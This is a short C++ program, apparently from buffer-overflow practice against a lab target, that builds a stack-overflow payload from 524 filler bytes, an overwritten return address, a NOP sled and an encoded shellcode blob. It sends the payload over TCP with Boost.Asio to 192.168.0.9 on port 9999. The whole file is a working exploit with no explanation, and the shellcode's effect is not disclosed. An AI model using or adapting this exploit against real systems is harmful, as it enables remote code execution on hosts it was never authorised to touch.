#include <iostream>
#include "../helper.cpp"
#include <boost/asio.hpp>

using namespace std;
using namespace boost;
using namespace NAM;

#define errormayhappen                              \
    if (ec.value())                                 \
    {                                               \
        cerr << "\nError : " + ec.message() + "\n"; \
        return ec.value();                          \
    }

int main()
{
    string exploit = "\xdb\xd4\xd9\x74\x24\xf4\x5e\xba\x4b\x56\xcb\xb5\x2b\xc9\xb1"
                     "\x1f\x83\xee\xfc\x31\x56\x16\x03\x56\x16\xe2\xbe\x3c\xc1\xeb"
                     "\x71\x1a\x22\xf0\x22\xdf\x9e\x9d\xc6\x6f\x46\xeb\x27\x42\x07"
                     "\x7c\xfc\x35\xc8\x2b\x02\xcc\xa0\x29\x02\xc1\x6c\xa7\xe3\x8b"
                     "\xea\xef\xb3\x1a\xa4\x86\xd2\xde\x87\x19\x91\x21\x6e\x03\xd7"
                     "\xd5\xac\x5b\x45\x15\xcf\x9b\xd1\x7c\xcf\xf1\xe4\x09\x2c\x34"
                     "\x2f\xc4\x33\xb2\x6f\xae\x8e\x56\x48\xe3\xf6\x11\x96\x13\xf9"
                     "\x61\x1f\xf0\x38\x8a\x13\x36\x59\x41\x9b\xc5\x53\xda\x5e\xf5"
                     "\x14\xcb\x3b\x7f\x05\x72\x09\x15\x76\x86\xa0\x6a\xf3\x49\x42"
                     "\x69\x03\xa8\x0a\x6c\xfb\x2b\x6a\xd4\xfa\x2b\x6a\x2a\x30\xab";

    string payload = createstr('A', 524) + "\xf3\x12\x17\x31" + createstr("\x90", 12) + exploit;

    system::error_code ec;
    asio::io_service ioservice;
    asio::ip::tcp::endpoint ep(asio::ip::address::from_string("192.168.0.9", ec), 9999);
    errormayhappen;
    asio::ip::tcp::socket client(ioservice);
    asio::ip::tcp protocol = asio::ip::tcp::v4();
    client.open(protocol, ec);
    errormayhappen;
    client.connect(ep, ec);
    errormayhappen;
    client.write_some(asio::buffer(payload.data(), payload.size()), ec);
    client.close(ec);
    errormayhappen;
    return 0;
}